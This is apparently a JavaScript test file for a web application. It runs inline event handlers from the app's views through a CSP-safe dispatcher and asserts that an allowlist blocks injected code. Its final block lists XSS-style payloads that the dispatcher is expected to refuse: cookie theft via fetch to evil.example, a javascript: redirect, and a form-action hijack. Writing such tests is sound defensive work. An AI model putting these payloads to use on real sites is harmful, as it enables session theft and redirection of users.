// Runs every inline handler found in the views through the CSP-safe dispatcher, then checks that the allowlist
// refuses what an injected handler would try. Usage: node tests/js/inline-handlers.test.js handlers.json
'use strict';
const fs = require('fs');
const path = require('path');
const assert = require('assert');

const calls = [];
const recorder = (name) => function (...args) { calls.push(name); return name === 'confirm' ? false : undefined; };
const element = (id) => ({ id, textContent: '', value: 'abc', files: [], click: recorder('click'), remove: recorder('remove'),
    form: { submit: recorder('form.submit') }, parentElement: {} });
const global = {
    document: { getElementById: (id) => element(id), querySelectorAll: () => [] },
    location: { href: '' },
    confirm: recorder('confirm'),
    print: recorder('print'),
    KrishiFavorites: { toggle: recorder('KrishiFavorites.toggle') },
    KrishiNotifications: { markAsRead: recorder('KrishiNotifications.markAsRead') },
    fetch: recorder('fetch')
};
global.window = global;

const source = fs.readFileSync(path.join(__dirname, '../../wwwroot/js/inline-handlers.js'), 'utf8');
new Function('window', 'globalThis', source)(global, global);
const { run } = global.KrishiInlineHandlers;
const allowed = source.match(/ALLOWED_CALLS = new Set\(\[([\s\S]*?)\]\)/)[1].match(/'([^']+)'/g).map((s) => s.slice(1, -1));
for (const name of allowed) if (!name.includes('.') && name !== 'confirm' && !global[name]) global[name] = recorder(name);

const event = () => ({ key: 'Enter', prevented: false, stopped: false,
    preventDefault() { this.prevented = true; }, stopPropagation() { this.stopped = true; } });

let failures = 0;
const handlers = JSON.parse(fs.readFileSync(process.argv[2], 'utf8'));
// Handler text assembled in C# (Views/Shared/_GeoSelector.cshtml changeHooks/districtHooks + OnDistrictChanged values).
for (const rendered of ['this.form.submit();', 'syncLocation(this.value); onFilterChanged(1);', 'this.form.submit();syncLocation(this.value); onFilterChanged(1);']) {
    handlers.push({ file: 'Views/Shared/_GeoSelector.cshtml', event: 'change', raw: rendered, rendered });
}
for (const h of handlers) {
    // Razor/template holes were rendered as 7; URLs they produce are same-site paths.
    const code = h.rendered.replace(/location\.href\s*=\s*'7'/g, "location.href='/7'");
    try {
        run(element('el'), event(), code);
    } catch (error) {
        failures++;
        console.error(`FAIL ${h.file} [${h.event}] ${h.raw}\n     ${error.message}`);
    }
}

// Semantics
const e1 = event();
run(element('f'), e1, "return confirm('Sure?')");
assert.ok(e1.prevented, 'return confirm() === false must cancel the event');
const e2 = event();
run(element('b'), e2, 'event.stopPropagation(); KrishiFavorites.toggle(this);');
assert.ok(e2.stopped, 'stopPropagation must run');
const target = element('counter');
global.document.getElementById = () => target;
run(element('i'), event(), "document.getElementById('counter').textContent = this.value.length + ' / 1000'");
assert.strictEqual(target.textContent, '3 / 1000');

// What injected markup would try must be refused.
for (const attack of [
    "fetch('https://evil.example/?c=' + document.cookie)",
    'goToPage(document.cookie)',
    "location.href='javascript:alert(1)'",
    "location.href='//evil.example'",
    "this.form.action='https://evil.example'",
    "KrishiFavorites.toggle.call(window)",
    'window.localStorage.clear()',
    "document.getElementById('x').innerHTML = 'y'",
    'constructor.constructor(1)'
]) {
    assert.throws(() => run(element('x'), event(), attack), `must refuse: ${attack}`);
}

console.log(`${handlers.length} handlers checked, ${failures} failed; allowlist and semantics OK`);
process.exit(failures ? 1 : 0);
